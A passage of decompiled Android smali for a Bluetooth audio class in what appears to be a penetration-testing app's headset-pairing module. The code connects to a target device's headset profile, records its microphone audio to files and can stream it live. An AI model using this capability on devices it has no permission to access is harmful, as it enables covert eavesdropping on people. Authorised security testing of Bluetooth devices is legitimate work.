.class public Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;
.super Ljava/lang/Object;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;,
        Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$ReadyCallback;,
        Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;,
        Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$RecordingCallback;,
        Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$RecordingInfo;
    }
.end annotation


# static fields
.field private static final BUFFER_SIZE_FACTOR:I = 0x2

.field private static final SAMPLE_RATE:I = 0x3e80

.field private static final TAG:Ljava/lang/String; = "WpairAudio"


# instance fields
.field private a2dpProfile:Landroid/bluetooth/BluetoothA2dp;

.field private audioManager:Landroid/media/AudioManager;

.field private volatile audioRecord:Landroid/media/AudioRecord;

.field private volatile audioTrack:Landroid/media/AudioTrack;

.field private final context:Landroid/content/Context;

.field private final handler:Landroid/os/Handler;

.field private headsetProfile:Landroid/bluetooth/BluetoothHeadset;

.field private volatile isListening:Z

.field private volatile isRecording:Z

.field private final lock:Ljava/lang/Object;

.field private profileListener:Landroid/bluetooth/BluetoothProfile$ServiceListener;

.field private recordingCallback:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$RecordingCallback;

.field private recordingStartTime:J

.field private scoReceiver:Landroid/content/BroadcastReceiver;

.field private stateCallback:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;

.field private targetDevice:Landroid/bluetooth/BluetoothDevice;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 2

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->handler:Landroid/os/Handler;

    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    iput-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->lock:Ljava/lang/Object;

    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    iput-object p1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->context:Landroid/content/Context;

    return-void
.end method

.method public static synthetic a(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->lambda$audioPassthroughLoop$6()V

    return-void
.end method

.method public static synthetic access$002(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;Landroid/bluetooth/BluetoothHeadset;)Landroid/bluetooth/BluetoothHeadset;
    .locals 0

    iput-object p1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->headsetProfile:Landroid/bluetooth/BluetoothHeadset;

    return-object p1
.end method

.method public static synthetic access$102(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;Landroid/bluetooth/BluetoothA2dp;)Landroid/bluetooth/BluetoothA2dp;
    .locals 0

    iput-object p1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->a2dpProfile:Landroid/bluetooth/BluetoothA2dp;

    return-object p1
.end method

.method public static synthetic access$200(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;)Z
    .locals 0

    iget-boolean p0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->isRecording:Z

    return p0
.end method

.method public static synthetic access$300(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;)Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;
    .locals 0

    iget-object p0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->stateCallback:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;

    return-object p0
.end method

.method public static synthetic access$400(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;)Z
    .locals 0

    iget-boolean p0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->isListening:Z

    return p0
.end method

.method public static synthetic access$500(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;)Landroid/bluetooth/BluetoothDevice;
    .locals 0

    iget-object p0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->targetDevice:Landroid/bluetooth/BluetoothDevice;

    return-object p0
.end method

.method private adapter()Landroid/bluetooth/BluetoothAdapter;
    .locals 2

    iget-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->context:Landroid/content/Context;

    const-string v1, "bluetooth"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/bluetooth/BluetoothManager;

    if-nez v0, :cond_0

    const/4 v0, 0x0

    goto :goto_0

    :cond_0
    invoke-virtual {v0}, Landroid/bluetooth/BluetoothManager;->getAdapter()Landroid/bluetooth/BluetoothAdapter;

    move-result-object v0

    :goto_0
    return-object v0
.end method

.method private audioPassthroughLoop(I)V
    .locals 8

    new-array v0, p1, [B

    iget-object v1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioRecord:Landroid/media/AudioRecord;

    iget-object v2, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioTrack:Landroid/media/AudioTrack;

    const-string v3, "WpairAudio"

    const/4 v4, 0x0

    if-eqz v1, :cond_0

    :try_start_0
    invoke-virtual {v1}, Landroid/media/AudioRecord;->startRecording()V

    goto :goto_0

    :catch_0
    move-exception p1

    goto :goto_2

    :cond_0
    :goto_0
    if-eqz v2, :cond_1

    invoke-virtual {v2}, Landroid/media/AudioTrack;->play()V

    :cond_1
    :goto_1
    iget-boolean v5, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->isListening:Z

    if-eqz v5, :cond_3

    if-eqz v1, :cond_3

    if-eqz v2, :cond_3

    invoke-virtual {v1}, Landroid/media/AudioRecord;->getState()I

    move-result v5

    const/4 v6, 0x1

    if-ne v5, v6, :cond_3

    invoke-virtual {v2}, Landroid/media/AudioTrack;->getState()I

    move-result v5

    if-ne v5, v6, :cond_3

    invoke-virtual {v1, v0, v4, p1}, Landroid/media/AudioRecord;->read([BII)I

    move-result v5

    if-lez v5, :cond_2

    invoke-virtual {v2}, Landroid/media/AudioTrack;->getState()I

    move-result v7

    if-ne v7, v6, :cond_1

    invoke-virtual {v2}, Landroid/media/AudioTrack;->getPlayState()I

    move-result v6

    const/4 v7, 0x3

    if-ne v6, v7, :cond_1

    invoke-virtual {v2, v0, v4, v5}, Landroid/media/AudioTrack;->write([BII)I

    goto :goto_1

    :cond_2
    if-gez v5, :cond_1

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "passthrough read err "

    invoke-virtual {p1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v3, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    :goto_2
    const-string v0, "passthrough loop"

    invoke-static {v3, v0, p1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_3
    :goto_3
    iget-object p1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->handler:Landroid/os/Handler;

    new-instance v0, Lcom/zalexdev/stryker/wpair/a;

    invoke-direct {v0, p0, v4}, Lcom/zalexdev/stryker/wpair/a;-><init>(Ljava/lang/Object;I)V

    invoke-virtual {p1, v0}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void
.end method

.method public static synthetic b(Landroid/bluetooth/BluetoothHeadset;Landroid/bluetooth/BluetoothDevice;Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;)V
    .locals 0

    .line 1
    invoke-static {p0, p1, p2}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->lambda$connectAudioProfile$0(Landroid/bluetooth/BluetoothHeadset;Landroid/bluetooth/BluetoothDevice;Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;)V

    return-void
.end method

.method public static synthetic c(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;Ljava/io/File;Ljava/io/File;I)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2, p3}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->lambda$startAudioCapture$2(Ljava/io/File;Ljava/io/File;I)V

    return-void
.end method

.method private convertPcmToM4a(Ljava/io/File;Ljava/io/File;)V
    .locals 22

    const-string v0, "audio/mp4a-latm"

    invoke-static {v0}, Landroid/media/MediaCodec;->createEncoderByType(Ljava/lang/String;)Landroid/media/MediaCodec;

    move-result-object v8

    new-instance v9, Landroid/media/MediaMuxer;

    invoke-virtual/range {p2 .. p2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    const/4 v10, 0x0

    invoke-direct {v9, v1, v10}, Landroid/media/MediaMuxer;-><init>(Ljava/lang/String;I)V

    const/16 v1, 0x3e80

    const/4 v11, 0x1

    :try_start_0
    invoke-static {v0, v1, v11}, Landroid/media/MediaFormat;->createAudioFormat(Ljava/lang/String;II)Landroid/media/MediaFormat;

    move-result-object v0

    const-string v1, "aac-profile"

    const/4 v12, 0x2

    invoke-virtual {v0, v1, v12}, Landroid/media/MediaFormat;->setInteger(Ljava/lang/String;I)V

    const-string v1, "bitrate"

    const v2, 0x1f400

    invoke-virtual {v0, v1, v2}, Landroid/media/MediaFormat;->setInteger(Ljava/lang/String;I)V

    const-string v1, "max-input-size"

    const/16 v2, 0x4000

    invoke-virtual {v0, v1, v2}, Landroid/media/MediaFormat;->setInteger(Ljava/lang/String;I)V

    const/4 v1, 0x0

    invoke-virtual {v8, v0, v1, v1, v11}, Landroid/media/MediaCodec;->configure(Landroid/media/MediaFormat;Landroid/view/Surface;Landroid/media/MediaCrypto;I)V

    invoke-virtual {v8}, Landroid/media/MediaCodec;->start()V

    new-instance v0, Landroid/media/MediaCodec$BufferInfo;

    invoke-direct {v0}, Landroid/media/MediaCodec$BufferInfo;-><init>()V

    new-instance v13, Ljava/io/FileInputStream;

    move-object/from16 v1, p1

    invoke-direct {v13, v1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    const/16 v14, 0x2000

    :try_start_1
    new-array v15, v14, [B

    const/4 v1, -0x1

    const-wide/16 v2, 0x0

    move v7, v1

    move-wide/from16 v16, v2

    move/from16 v18, v10

    move/from16 v19, v18

    :goto_0
    const-wide/16 v5, 0x2710

    if-nez v18, :cond_1

    invoke-virtual {v8, v5, v6}, Landroid/media/MediaCodec;->dequeueInputBuffer(J)I

    move-result v2

    if-ltz v2, :cond_1

    invoke-virtual {v8, v2}, Landroid/media/MediaCodec;->getInputBuffer(I)Ljava/nio/ByteBuffer;

    move-result-object v1

    if-eqz v1, :cond_1

    invoke-virtual {v1}, Ljava/nio/ByteBuffer;->clear()Ljava/nio/Buffer;

    invoke-virtual {v1}, Ljava/nio/Buffer;->remaining()I

    move-result v3

    invoke-static {v14, v3}, Ljava/lang/Math;->min(II)I

    move-result v3

    invoke-virtual {v13, v15, v10, v3}, Ljava/io/FileInputStream;->read([BII)I

    move-result v4

    if-gez v4, :cond_0

    const/4 v3, 0x0

    const/4 v4, 0x0

    const-wide/16 v20, 0x0

    const/16 v18, 0x4

    move-object v1, v8

    move-wide v11, v5

    move-wide/from16 v5, v20

    move v14, v7

    move/from16 v7, v18

    invoke-virtual/range {v1 .. v7}, Landroid/media/MediaCodec;->queueInputBuffer(IIIJI)V

    const/16 v18, 0x1

    goto :goto_1

    :catchall_0
    move-exception v0

    goto/16 :goto_4

    :cond_0
    move-wide v11, v5

    move v14, v7

    invoke-virtual {v1, v15, v10, v4}, Ljava/nio/ByteBuffer;->put([BII)Ljava/nio/ByteBuffer;

    const/4 v3, 0x0

    const/4 v7, 0x0

    move-object v1, v8

    move v5, v4

    move v10, v5

    move-wide/from16 v5, v16

    invoke-virtual/range {v1 .. v7}, Landroid/media/MediaCodec;->queueInputBuffer(IIIJI)V

    int-to-long v1, v10

    const-wide/32 v3, 0xf4240

    mul-long/2addr v1, v3

    const-wide/16 v3, 0x7d00

    div-long/2addr v1, v3

    add-long v16, v16, v1

    goto :goto_1

    :cond_1
    move-wide v11, v5

    move v14, v7

    :goto_1
    invoke-virtual {v8, v0, v11, v12}, Landroid/media/MediaCodec;->dequeueOutputBuffer(Landroid/media/MediaCodec$BufferInfo;J)I

    move-result v1

    const/4 v2, -0x2

    if-ne v1, v2, :cond_2

    invoke-virtual {v8}, Landroid/media/MediaCodec;->getOutputFormat()Landroid/media/MediaFormat;

    move-result-object v1

    invoke-virtual {v9, v1}, Landroid/media/MediaMuxer;->addTrack(Landroid/media/MediaFormat;)I

    move-result v1

    invoke-virtual {v9}, Landroid/media/MediaMuxer;->start()V

    move v7, v1

    const/4 v2, 0x0

    const/4 v4, 0x2

    const/16 v19, 0x1

    goto :goto_3

    :cond_2
    if-ltz v1, :cond_5

    invoke-virtual {v8, v1}, Landroid/media/MediaCodec;->getOutputBuffer(I)Ljava/nio/ByteBuffer;

    move-result-object v2

    iget v3, v0, Landroid/media/MediaCodec$BufferInfo;->flags:I

    const/4 v4, 0x2

    and-int/2addr v3, v4

    if-eqz v3, :cond_3

    const/4 v3, 0x0

    iput v3, v0, Landroid/media/MediaCodec$BufferInfo;->size:I

    :cond_3
    iget v3, v0, Landroid/media/MediaCodec$BufferInfo;->size:I

    if-lez v3, :cond_4

    if-eqz v19, :cond_4

    if-eqz v2, :cond_4

    iget v3, v0, Landroid/media/MediaCodec$BufferInfo;->offset:I

    invoke-virtual {v2, v3}, Ljava/nio/ByteBuffer;->position(I)Ljava/nio/Buffer;

    iget v3, v0, Landroid/media/MediaCodec$BufferInfo;->offset:I

    iget v5, v0, Landroid/media/MediaCodec$BufferInfo;->size:I

    add-int/2addr v3, v5

    invoke-virtual {v2, v3}, Ljava/nio/ByteBuffer;->limit(I)Ljava/nio/Buffer;

    invoke-virtual {v9, v14, v2, v0}, Landroid/media/MediaMuxer;->writeSampleData(ILjava/nio/ByteBuffer;Landroid/media/MediaCodec$BufferInfo;)V

    :cond_4
    const/4 v2, 0x0

    invoke-virtual {v8, v1, v2}, Landroid/media/MediaCodec;->releaseOutputBuffer(IZ)V

    iget v1, v0, Landroid/media/MediaCodec$BufferInfo;->flags:I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    and-int/lit8 v1, v1, 0x4

    if-eqz v1, :cond_6

    :try_start_2
    invoke-virtual {v13}, Ljava/io/FileInputStream;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    goto :goto_2

    :catchall_1
    move-exception v0

    goto :goto_5

    :catch_0
    :goto_2
    :try_start_3
    invoke-virtual {v8}, Landroid/media/MediaCodec;->stop()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    :catch_1
    :try_start_4
    invoke-virtual {v8}, Landroid/media/MediaCodec;->release()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    :catch_2
    :try_start_5
    invoke-virtual {v9}, Landroid/media/MediaMuxer;->stop()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    :catch_3
    :try_start_6
    invoke-virtual {v9}, Landroid/media/MediaMuxer;->release()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    :catch_4
    return-void

    :cond_5
    const/4 v2, 0x0

    const/4 v4, 0x2

    :cond_6
    move v7, v14

    :goto_3
    move v10, v2

    move v12, v4

    const/4 v11, 0x1

    const/16 v14, 0x2000

    goto/16 :goto_0

    :goto_4
    :try_start_7
    invoke-virtual {v13}, Ljava/io/FileInputStream;->close()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_5
    .catchall {:try_start_7 .. :try_end_7} :catchall_1

    :catch_5
    :try_start_8
    throw v0
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_1

    :goto_5
    :try_start_9
    invoke-virtual {v8}, Landroid/media/MediaCodec;->stop()V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_6

    :catch_6
    :try_start_a
    invoke-virtual {v8}, Landroid/media/MediaCodec;->release()V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_7

    :catch_7
    :try_start_b
    invoke-virtual {v9}, Landroid/media/MediaMuxer;->stop()V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_8

    :catch_8
    :try_start_c
    invoke-virtual {v9}, Landroid/media/MediaMuxer;->release()V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_9

    :catch_9
    throw v0
.end method

.method public static synthetic d(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;Ljava/io/File;Ljava/io/File;Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2, p3}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->lambda$startRecording$1(Ljava/io/File;Ljava/io/File;Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;)V

    return-void
.end method

.method public static synthetic e(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;Ljava/io/File;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->lambda$recordAudioLoop$3(Ljava/io/File;)V

    return-void
.end method

.method public static synthetic f(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;I)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->lambda$startAudioPassthrough$5(I)V

    return-void
.end method

.method public static synthetic g(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->lambda$startListening$4(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;)V

    return-void
.end method

.method private synthetic lambda$audioPassthroughLoop$6()V
    .locals 2

    iget-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->stateCallback:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;

    if-eqz v0, :cond_0

    sget-object v1, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Connected;->INSTANCE:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Connected;

    invoke-interface {v0, v1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    :cond_0
    return-void
.end method

.method private static synthetic lambda$connectAudioProfile$0(Landroid/bluetooth/BluetoothHeadset;Landroid/bluetooth/BluetoothDevice;Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;)V
    .locals 0

    :try_start_0
    invoke-virtual {p0}, Landroid/bluetooth/BluetoothHeadset;->getConnectedDevices()Ljava/util/List;

    move-result-object p0

    invoke-interface {p0, p1}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    sget-object p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Connected;->INSTANCE:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Connected;

    :goto_0
    invoke-interface {p2, p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    goto :goto_1

    :cond_0
    new-instance p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    const-string p1, "HFP_TIMEOUT"

    invoke-direct {p0, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    new-instance p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;

    const-string p1, "Connection check failed"

    invoke-direct {p0, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Error;-><init>(Ljava/lang/String;)V

    invoke-interface {p2, p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    :goto_1
    return-void
.end method

.method private synthetic lambda$recordAudioLoop$3(Ljava/io/File;)V
    .locals 10

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iget-wide v2, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->recordingStartTime:J

    sub-long v6, v0, v2

    new-instance v0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$RecordingInfo;

    invoke-virtual {p1}, Ljava/io/File;->length()J

    move-result-wide v8

    move-object v4, v0

    move-object v5, p1

    invoke-direct/range {v4 .. v9}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$RecordingInfo;-><init>(Ljava/io/File;JJ)V

    iget-object p1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->recordingCallback:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$RecordingCallback;

    if-eqz p1, :cond_0

    invoke-interface {p1, v0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$RecordingCallback;->onRecording(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$RecordingInfo;)V

    :cond_0
    iget-object p1, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->stateCallback:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;

    if-eqz p1, :cond_1

    sget-object v0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Connected;->INSTANCE:Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState$Connected;

    invoke-interface {p1, v0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;->onState(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$AudioState;)V

    :cond_1
    return-void
.end method

.method private synthetic lambda$startAudioCapture$2(Ljava/io/File;Ljava/io/File;I)V
    .locals 0

    invoke-direct {p0, p1, p2, p3}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->recordAudioLoop(Ljava/io/File;Ljava/io/File;I)V

    return-void
.end method

.method private synthetic lambda$startAudioPassthrough$5(I)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioPassthroughLoop(I)V

    return-void
.end method

.method private synthetic lambda$startListening$4(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->startAudioPassthrough(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;)V

    return-void
.end method

.method private synthetic lambda$startRecording$1(Ljava/io/File;Ljava/io/File;Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;)V
    .locals 0

    invoke-direct {p0, p1, p2, p3}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->startAudioCapture(Ljava/io/File;Ljava/io/File;Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$StateCallback;)V

    return-void
.end method

.method private recordAudioLoop(Ljava/io/File;Ljava/io/File;I)V
    .locals 6

    const-string v0, "WpairAudio"

    new-array v1, p3, [B

    iget-object v2, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->audioRecord:Landroid/media/AudioRecord;

    const/4 v3, 0x0

    :try_start_0
    new-instance v4, Ljava/io/FileOutputStream;

    invoke-direct {v4, p1}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    if-eqz v2, :cond_0

    :try_start_1
    invoke-virtual {v2}, Landroid/media/AudioRecord;->startRecording()V

    goto :goto_0

    :catchall_0
    move-exception p1

    move-object v3, v4

    goto :goto_4

    :catch_0
    move-exception p3

    move-object v3, v4

    goto :goto_1

    :cond_0
    :goto_0
    iget-boolean v3, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->isRecording:Z

    if-eqz v3, :cond_2

    if-eqz v2, :cond_2

    invoke-virtual {v2}, Landroid/media/AudioRecord;->getState()I

    move-result v3

    const/4 v5, 0x1

    if-ne v3, v5, :cond_2

    const/4 v3, 0x0

    invoke-virtual {v2, v1, v3, p3}, Landroid/media/AudioRecord;->read([BII)I

    move-result v5

    if-lez v5, :cond_1

    invoke-virtual {v4, v1, v3, v5}, Ljava/io/FileOutputStream;->write([BII)V

    goto :goto_0

    :cond_1
    if-gez v5, :cond_0

    new-instance p3, Ljava/lang/StringBuilder;

    invoke-direct {p3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "AudioRecord error: "

    invoke-virtual {p3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p3, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {p3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p3

    invoke-static {v0, p3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :cond_2
    :try_start_2
    invoke-virtual {v4}, Ljava/io/FileOutputStream;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_2

    :catchall_1
    move-exception p1

    goto :goto_4

    :catch_1
    move-exception p3

    :goto_1
    :try_start_3
    const-string v1, "record loop"

    invoke-static {v0, v1, p3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    if-eqz v3, :cond_3

    :try_start_4
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    :catch_2
    :cond_3
    :goto_2
    :try_start_5
    invoke-direct {p0, p1, p2}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->convertPcmToM4a(Ljava/io/File;Ljava/io/File;)V

    invoke-virtual {p1}, Ljava/io/File;->delete()Z
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    move-object p1, p2

    goto :goto_3

    :catch_3
    move-exception p2

    const-string p3, "m4a convert failed, keep pcm"

    invoke-static {v0, p3, p2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_3
    iget-object p2, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->handler:Landroid/os/Handler;

    new-instance p3, Lcom/zalexdev/stryker/wpair/e;

    const/4 v0, 0x5

    invoke-direct {p3, p0, p1, v0}, Lcom/zalexdev/stryker/wpair/e;-><init>(Ljava/lang/Object;Ljava/lang/Object;I)V

    invoke-virtual {p2, p3}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void

    :goto_4
    if-eqz v3, :cond_4

    :try_start_6
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    :catch_4
    :cond_4
    throw p1
.end method

.method private registerScoReceiver()V
    .locals 3

    iget-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->scoReceiver:Landroid/content/BroadcastReceiver;

    if-eqz v0, :cond_0

    return-void

    :cond_0
    new-instance v0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$2;

    invoke-direct {v0, p0}, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager$2;-><init>(Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;)V

    iput-object v0, p0, Lcom/zalexdev/stryker/wpair/BluetoothAudioManager;->scoReceiver:Landroid/content/BroadcastReceiver;

    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    const-string v1, "android.media.ACTION_SCO_AUDIO_STATE_UPDATED"

    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

